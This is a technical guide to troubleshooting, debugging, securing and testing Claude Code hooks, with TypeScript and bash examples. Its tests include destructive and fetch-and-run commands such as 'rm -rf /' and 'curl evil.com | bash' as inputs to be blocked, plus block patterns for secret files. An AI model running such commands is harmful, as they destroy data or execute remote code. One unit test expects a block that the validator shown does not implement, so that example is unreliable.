# Claude Code Hooks: Troubleshooting and Best Practices

> **Sources**: [Claude Code Hooks Documentation](https://docs.anthropic.com/en/docs/claude-code/hooks), [Claude Code Settings Documentation](https://docs.anthropic.com/en/docs/claude-code/settings)

This guide provides troubleshooting solutions, debugging techniques, and best practices for Claude Code hooks development and deployment.

## Table of Contents

1. [Common Issues and Solutions](#common-issues-and-solutions)
2. [Debugging Techniques](#debugging-techniques)
3. [Best Practices](#best-practices)
4. [Performance Optimization](#performance-optimization)
5. [Security Guidelines](#security-guidelines)
6. [Testing and Validation](#testing-and-validation)

## Common Issues and Solutions

### 1. Hook Not Executing

**Symptoms**: Hook command doesn't run when expected

**Possible Causes & Solutions**:

#### Invalid Configuration Syntax

```json
// ❌ Incorrect
{
  "hooks": {
    "PreToolUse": {
      "Bash" "echo 'hello'"  // Missing colon
    }
  }
}

// ✅ Correct
{
  "hooks": {
    "PreToolUse": {
      "Bash": "echo 'hello'"
    }
  }
}
```

#### Settings File Not Found

```bash
# Check if settings file exists
ls -la .claude/settings.json
ls -la ~/.claude/settings.json

# Verify JSON syntax
cat .claude/settings.json | json_pp
```

#### Wrong Tool Name

```json
// ❌ Incorrect tool names
{
  "hooks": {
    "PreToolUse": {
      "bash": "echo 'test'",      // lowercase
      "Terminal": "echo 'test'"   // wrong name
    }
  }
}

// ✅ Correct tool names
{
  "hooks": {
    "PreToolUse": {
      "Bash": "echo 'test'",
      "Edit": "echo 'test'"
    }
  }
}
```

### 2. Hook Times Out

**Symptoms**: Hook execution is terminated due to timeout

**Solutions**:

#### Increase Timeout

```json
{
  "hooks": {
    "PreToolUse": {
      "Bash": {
        "command": "bun run slow-validation.ts",
        "timeout": 30000 // 30 seconds instead of default 10
      }
    }
  }
}
```

#### Optimize Hook Performance

```typescript
// ❌ Slow: Multiple synchronous operations
function slowHook() {
  execSync('npm install');
  execSync('npm run build');
  execSync('npm run test');
}

// ✅ Fast: Parallel operations with early exit
async function fastHook() {
  const operations = [checkCache(), validateQuickly(), essentialCheck()];

  const results = await Promise.allSettled(operations);
  const failures = results.filter((r) => r.status === 'rejected');

  if (failures.length > 0) {
    console.error('Hook validation failed');
    process.exit(1);
  }
}
```

### 3. Hook Blocking Tool Execution Incorrectly

**Symptoms**: Hook blocks legitimate operations

**Solutions**:

#### Review Exit Codes

```typescript
// ❌ Always blocks on any error
if (someCondition) {
  console.error('Error occurred');
  process.exit(1); // Blocks tool execution
}

// ✅ Only block on critical errors
if (isCriticalError(error)) {
  console.error('Critical error:', error);
  process.exit(1); // Block tool execution
} else {
  console.warn('Warning:', error);
  process.exit(0); // Continue with warning
}
```

#### Implement Proper Validation Logic

```typescript
function validateBashCommand(command: string): boolean {
  // ❌ Too restrictive
  if (command.includes('rm')) {
    return false; // Blocks 'rm temp.txt' which might be legitimate
  }

  // ✅ More nuanced validation
  const dangerousPatterns = [
    /rm\s+-rf\s+(\/|\$HOME|\~)/, // Only dangerous rm commands
    /sudo\s+rm\s+-rf/, // Dangerous sudo rm
  ];

  return !dangerousPatterns.some((pattern) => pattern.test(command));
}
```

### 4. Environment Variables Not Available

**Symptoms**: Hook can't access expected environment variables

**Solutions**:

#### Check Variable Names

```typescript
// ❌ Incorrect variable names
const toolName = process.env.TOOL_NAME; // Wrong
const sessionId = process.env.SESSION_ID; // Wrong

// ✅ Correct variable names
const toolName = process.env.CLAUDE_TOOL_NAME;
const sessionId = process.env.CLAUDE_SESSION_ID;
const toolInput = process.env.TOOL_INPUT;
```

#### Handle Missing Variables

```typescript
// ❌ No fallback handling
const workspacePath = process.env.CLAUDE_PROJECT_DIR;
const files = fs.readdirSync(workspacePath); // Crashes if undefined

// ✅ Proper fallback handling
const workspacePath = process.env.CLAUDE_PROJECT_DIR || process.cwd();
if (!fs.existsSync(workspacePath)) {
  console.error('Invalid workspace path');
  process.exit(1);
}
```

### 5. JSON Parsing Errors

**Symptoms**: Hook fails when parsing TOOL_INPUT

**Solutions**:

#### Robust JSON Parsing

```typescript
// ❌ Fragile parsing
const toolInput = JSON.parse(process.env.TOOL_INPUT);

// ✅ Robust parsing with error handling
function parseToolInput(): Record<string, any> {
  const inputStr = process.env.TOOL_INPUT;

  if (!inputStr) {
    return {};
  }

  try {
    return JSON.parse(inputStr);
  } catch (error) {
    console.error('Failed to parse TOOL_INPUT:', error);
    console.error('Raw input:', inputStr);
    return {};
  }
}
```

## Debugging Techniques

### 1. Enable Verbose Logging

Create a debug utility (`scripts/debug-utils.ts`):

```typescript
export const DEBUG = process.env.CLAUDE_HOOK_DEBUG === 'true';

export function debugLog(message: string, data?: any): void {
  if (DEBUG) {
    console.log(`[DEBUG] ${message}`);
    if (data) {
      console.log(JSON.stringify(data, null, 2));
    }
  }
}

export function logEnvironment(): void {
  if (DEBUG) {
    console.log('=== HOOK ENVIRONMENT ===');
    Object.entries(process.env)
      .filter(([key]) => key.startsWith('CLAUDE_') || ['TOOL_INPUT', 'TOOL_OUTPUT'].includes(key))
      .forEach(([key, value]) => {
        console.log(`${key}=${value}`);
      });
    console.log('========================');
  }
}
```

Usage in hooks:

```typescript
import { debugLog, logEnvironment } from './debug-utils.ts';

async function main() {
  logEnvironment();
  debugLog('Hook starting', { toolName: process.env.CLAUDE_TOOL_NAME });

  // Hook logic...

  debugLog('Hook completed successfully');
}
```

Enable debugging:

```bash
export CLAUDE_HOOK_DEBUG=true
# Run Claude Code operations to see debug output
```

### 2. Hook Execution Tracing

Create a tracing wrapper (`scripts/trace-hook.ts`):

```typescript
#!/usr/bin/env bun

import { spawn } from 'child_process';
import { writeFileSync, appendFileSync } from 'fs';
import { join } from 'path';

const traceFile = join(process.cwd(), '.claude', 'hook-trace.log');

function logTrace(event: string, data: any): void {
  const timestamp = new Date().toISOString();
  const entry = `[${timestamp}] ${event}: ${JSON.stringify(data)}\n`;

  try {
    appendFileSync(traceFile, entry);
  } catch (error) {
    console.error('Failed to write trace log:', error);
  }
}

function traceHookExecution(command: string[], hookType: string, toolName: string): void {
  logTrace('HOOK_START', {
    hookType,
    toolName,
    command: command.join(' '),
    environment: {
      CLAUDE_SESSION_ID: process.env.CLAUDE_SESSION_ID,
      CLAUDE_PROJECT_DIR: process.env.CLAUDE_PROJECT_DIR,
      TOOL_INPUT: process.env.TOOL_INPUT,
    },
  });

  const startTime = Date.now();
  const childProcess = spawn(command[0], command.slice(1), {
    stdio: 'inherit',
    env: process.env,
  });

  childProcess.on('close', (code) => {
    const duration = Date.now() - startTime;
    logTrace('HOOK_END', {
      hookType,
      toolName,
      exitCode: code,
      duration: `${duration}ms`,
    });

    process.exit(code || 0);
  });

  childProcess.on('error', (error) => {
    logTrace('HOOK_ERROR', {
      hookType,
      toolName,
      error: error.message,
    });
    process.exit(1);
  });
}

// Usage: bun run trace-hook.ts PreToolUse Bash bun run my-hook.ts
const [, , hookType, toolName, ...command] = process.argv;
traceHookExecution(command, hookType, toolName);
```

### 3. Hook Testing Framework

Create a test harness (`scripts/test-hook.ts`):

```typescript
#!/usr/bin/env bun

import { spawn } from 'child_process';

interface HookTestCase {
  name: string;
  hookType: string;
  toolName: string;
  environment: Record<string, string>;
  expectedExitCode: number;
  timeout?: number;
}

const testCases: HookTestCase[] = [
  {
    name: 'Valid bash command',
    hookType: 'PreToolUse',
    toolName: 'Bash',
    environment: {
      TOOL_INPUT: JSON.stringify({ command: 'ls -la' }),
    },
    expectedExitCode: 0,
  },
  {
    name: 'Dangerous bash command',
    hookType: 'PreToolUse',
    toolName: 'Bash',
    environment: {
      TOOL_INPUT: JSON.stringify({ command: 'rm -rf /' }),
    },
    expectedExitCode: 1,
  },
  {
    name: 'File write operation',
    hookType: 'PostToolUse',
    toolName: 'Write',
    environment: {
      TOOL_INPUT: JSON.stringify({
        file_path: 'test.ts',
        content: 'console.log("test");',
      }),
    },
    expectedExitCode: 0,
  },
];

async function runHookTest(testCase: HookTestCase, hookScript: string): Promise<boolean> {
  console.log(`Running test: ${testCase.name}`);

  return new Promise((resolve) => {
    const env = {
      ...process.env,
      CLAUDE_TOOL_NAME: testCase.toolName,
      CLAUDE_SESSION_ID: 'test-session',
      CLAUDE_PROJECT_DIR: process.cwd(),
      ...testCase.environment,
    };

    const child = spawn('bun', ['run', hookScript], {
      env,
      stdio: 'pipe',
    });

    const timeout = setTimeout(() => {
      child.kill();
      console.log(`❌ ${testCase.name}: Timeout`);
      resolve(false);
    }, testCase.timeout || 5000);

    child.on('close', (code) => {
      clearTimeout(timeout);

      if (code === testCase.expectedExitCode) {
        console.log(`✅ ${testCase.name}: Passed`);
        resolve(true);
      } else {
        console.log(`❌ ${testCase.name}: Expected exit ${testCase.expectedExitCode}, got ${code}`);
        resolve(false);
      }
    });
  });
}

async function runAllTests(hookScript: string): Promise<void> {
  console.log(`Testing hook script: ${hookScript}`);

  let passed = 0;
  let total = testCases.length;

  for (const testCase of testCases) {
    const success = await runHookTest(testCase, hookScript);
    if (success) passed++;
  }

  console.log(`\nResults: ${passed}/${total} tests passed`);

  if (passed !== total) {
    process.exit(1);
  }
}

// Usage: bun run test-hook.ts hooks/pre-tool-use.ts
const [, , hookScript] = process.argv;
if (!hookScript) {
  console.error('Usage: bun run test-hook.ts <hook-script>');
  process.exit(1);
}

runAllTests(hookScript);
```

## Best Practices

### 1. Hook Design Principles

#### Keep Hooks Fast and Focused

```typescript
// ❌ Slow, doing too much
async function slowHook() {
  await updateDatabase();
  await syncWithRemote();
  await generateReports();
  await sendNotifications();
}

// ✅ Fast, focused on immediate validation
async function fastHook() {
  // Only validate what's necessary for the current operation
  validateInputSafety();
  checkPermissions();
  // Defer non-critical operations
}
```

#### Use Proper Error Handling

```typescript
// ❌ Poor error handling
function badHook() {
  validateSomething(); // May throw, causing hook failure
}

// ✅ Comprehensive error handling
function goodHook() {
  try {
    validateSomething();
  } catch (error) {
    if (error instanceof CriticalError) {
      console.error('Critical validation failed:', error.message);
      process.exit(1); // Block operation
    } else {
      console.warn('Non-critical issue:', error.message);
      process.exit(0); // Continue with warning
    }
  }
}
```

#### Provide Clear Feedback

```typescript
function feedbackHook() {
  console.log('🔍 Validating command...');

  if (isValid) {
    console.log('✅ Validation passed');
  } else {
    console.error('❌ Validation failed: Dangerous command detected');
    console.error('Command:', command);
    console.error('Blocked patterns:', blockedPatterns.join(', '));
  }
}
```

### 2. Configuration Management

#### Use Environment-Based Configuration

```json
{
  "hooks": {
    "PreToolUse": {
      "Bash": {
        "command": "bun run hooks/pre-tool-use.ts",
        "timeout": 5000
      }
    }
  }
}
```

```typescript
// hooks/pre-tool-use.ts - Environment-aware hook
const isProduction = process.env.NODE_ENV === 'production';
const strictMode = process.env.CLAUDE_STRICT_MODE === 'true';

if (isProduction || strictMode) {
  applyStrictValidation();
} else {
  applyDevelopmentValidation();
}
```

#### Centralize Hook Logic

```typescript
// hooks/lib/hook-manager.ts
export class HookManager {
  private static instance: HookManager;
  private config: HookConfig;

  static getInstance(): HookManager {
    if (!HookManager.instance) {
      HookManager.instance = new HookManager();
    }
    return HookManager.instance;
  }

  async executePreHook(toolName: string, input: any): Promise<HookResult> {
    const validators = this.getValidators(toolName);

    for (const validator of validators) {
      const result = await validator.validate(input);
      if (!result.success && result.blocking) {
        return result;
      }
    }

    return { success: true };
  }
}
```

### 3. Security Best Practices

#### Input Sanitization

```typescript
function sanitizeInput(input: string): string {
  // Remove potentially dangerous characters
  return input
    .replace(/[;&|`$(){}[\]]/g, '') // Shell metacharacters
    .replace(/\.\.\//g, '') // Path traversal
    .trim();
}

function validateFilePath(filePath: string): boolean {
  const sanitized = sanitizeInput(filePath);

  // Must be within workspace
  const resolved = path.resolve(process.cwd(), sanitized);
  if (!resolved.startsWith(process.cwd())) {
    return false;
  }

  // No sensitive files
  const sensitive = ['.env', '.secret', '.key'];
  if (sensitive.some((pattern) => sanitized.includes(pattern))) {
    return false;
  }

  return true;
}
```

#### Principle of Least Privilege

```typescript
// ❌ Too permissive
function permissiveHook() {
  // Allows any operation
  return { success: true };
}

// ✅ Restrictive by default
function restrictiveHook() {
  const allowedOperations = getConfiguredAllowedOperations();

  if (!allowedOperations.includes(currentOperation)) {
    console.error(`Operation not allowed: ${currentOperation}`);
    return { success: false, block: true };
  }

  return { success: true };
}
```

### 4. Performance Optimization

#### Implement Caching

```typescript
const cache = new Map<string, { result: any; timestamp: number }>();
const CACHE_TTL = 5 * 60 * 1000; // 5 minutes

function getCachedResult(key: string): any | null {
  const cached = cache.get(key);
  if (!cached) return null;

  if (Date.now() - cached.timestamp > CACHE_TTL) {
    cache.delete(key);
    return null;
  }

  return cached.result;
}

function setCachedResult(key: string, result: any): void {
  cache.set(key, { result, timestamp: Date.now() });
}

async function expensiveValidation(input: string): Promise<boolean> {
  const cacheKey = `validation:${input}`;
  const cached = getCachedResult(cacheKey);

  if (cached !== null) {
    return cached;
  }

  const result = await performExpensiveValidation(input);
  setCachedResult(cacheKey, result);

  return result;
}
```

#### Parallel Processing

```typescript
// ❌ Sequential validation
async function slowValidation(inputs: string[]) {
  for (const input of inputs) {
    await validateInput(input);
  }
}

// ✅ Parallel validation
async function fastValidation(inputs: string[]) {
  const validations = inputs.map((input) => validateInput(input));
  const results = await Promise.allSettled(validations);

  const failures = results.filter((r) => r.status === 'rejected');
  if (failures.length > 0) {
    throw new Error(`${failures.length} validations failed`);
  }
}
```

## Security Guidelines

### 1. Command Injection Prevention

```typescript
// ❌ Vulnerable to injection
function vulnerableHook(userInput: string) {
  exec(`echo ${userInput}`); // Dangerous!
}

// ✅ Safe parameter handling
import { spawn } from 'node:child_process';
function safeHook(userInput: string) {
  const sanitized = sanitizeInput(userInput);
  const child = spawn('echo', [sanitized], { stdio: 'inherit' });
  child.on('close', (code) => process.exit(code ?? 0));
}
```

### 2. File System Protection

```typescript
function protectFileSystem(filePath: string): boolean {
  const resolved = path.resolve(filePath);
  const workspace = path.resolve(process.env.CLAUDE_PROJECT_DIR || '');

  // Prevent path traversal
  if (!resolved.startsWith(workspace)) {
    console.error('Path traversal attempt blocked:', filePath);
    return false;
  }

  // Protect sensitive files
  const sensitivePatterns = [/\.env/, /\.secret/, /private.*key/, /\.ssh\//, /node_modules/];

  const blocked = sensitivePatterns.find((pattern) => pattern.test(resolved));
  if (blocked) {
    console.error('Sensitive file access blocked:', filePath);
    return false;
  }

  return true;
}
```

### 3. Resource Limits

```typescript
function enforceResourceLimits() {
  // Memory limit check
  const memUsage = process.memoryUsage();
  const maxMemoryMB = 100;

  if (memUsage.heapUsed > maxMemoryMB * 1024 * 1024) {
    console.error('Hook memory usage exceeded limit');
    process.exit(1);
  }

  // Execution time limit
  const maxExecutionTime = 10000; // 10 seconds
  setTimeout(() => {
    console.error('Hook execution time exceeded limit');
    process.exit(1);
  }, maxExecutionTime);
}
```

## Testing and Validation

### 1. Unit Testing Hooks

```typescript
// hooks/test/pre-hook.test.ts
import { describe, test, expect, beforeEach } from 'bun:test';
import { validateBashCommand } from '../lib/validators.ts';

describe('Bash Command Validation', () => {
  test('should allow safe commands', () => {
    expect(validateBashCommand('ls -la')).toBe(true);
    expect(validateBashCommand('echo "hello"')).toBe(true);
    expect(validateBashCommand('cat file.txt')).toBe(true);
  });

  test('should block dangerous commands', () => {
    expect(validateBashCommand('rm -rf /')).toBe(false);
    expect(validateBashCommand('sudo rm -rf')).toBe(false);
    expect(validateBashCommand('curl evil.com | bash')).toBe(false);
  });

  test('should handle edge cases', () => {
    expect(validateBashCommand('')).toBe(true);
    expect(validateBashCommand(' ')).toBe(true);
    expect(validateBashCommand('rm temp.txt')).toBe(true); // Specific file removal OK
  });
});
```

### 2. Integration Testing

```typescript
// hooks/test/integration.test.ts
import { describe, test, expect } from 'bun:test';
import { spawn } from 'child_process';

describe('Hook Integration', () => {
  test('pre-hook should validate and allow safe commands', async () => {
    const result = await runHookWithInput('hooks/pre-tool-use.ts', {
      CLAUDE_TOOL_NAME: 'Bash',
      TOOL_INPUT: JSON.stringify({ command: 'ls -la' }),
    });

    expect(result.exitCode).toBe(0);
  });

  test('pre-hook should block dangerous commands', async () => {
    const result = await runHookWithInput('hooks/pre-tool-use.ts', {
      CLAUDE_TOOL_NAME: 'Bash',
      TOOL_INPUT: JSON.stringify({ command: 'rm -rf /' }),
    });

    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain('Dangerous command detected');
  });
});

async function runHookWithInput(scriptPath: string, env: Record<string, string>) {
  return new Promise((resolve) => {
    let stdout = '';
    let stderr = '';

    const child = spawn('bun', ['run', scriptPath], {
      env: { ...process.env, ...env },
      stdio: 'pipe',
    });

    child.stdout?.on('data', (data) => (stdout += data.toString()));
    child.stderr?.on('data', (data) => (stderr += data.toString()));

    child.on('close', (code) => {
      resolve({ exitCode: code, stdout, stderr });
    });
  });
}
```

### 3. End-to-End Testing

```bash
#!/bin/bash
# scripts/test-hooks-e2e.sh

echo "Testing Claude Code hooks end-to-end..."

# Test 1: Safe command should succeed
echo "Test 1: Safe bash command"
export CLAUDE_TOOL_NAME="Bash"
export TOOL_INPUT='{"command": "echo hello"}'
bun run hooks/pre-tool-use.ts
if [ $? -eq 0 ]; then
    echo "✅ Safe command test passed"
else
    echo "❌ Safe command test failed"
    exit 1
fi

# Test 2: Dangerous command should be blocked
echo "Test 2: Dangerous bash command"
export TOOL_INPUT='{"command": "rm -rf /"}'
bun run hooks/pre-tool-use.ts
if [ $? -eq 1 ]; then
    echo "✅ Dangerous command test passed"
else
    echo "❌ Dangerous command test failed"
    exit 1
fi

echo "All end-to-end tests passed!"
```

This comprehensive troubleshooting and best practices guide should help developers successfully implement, debug, and maintain Claude Code hooks in their projects.
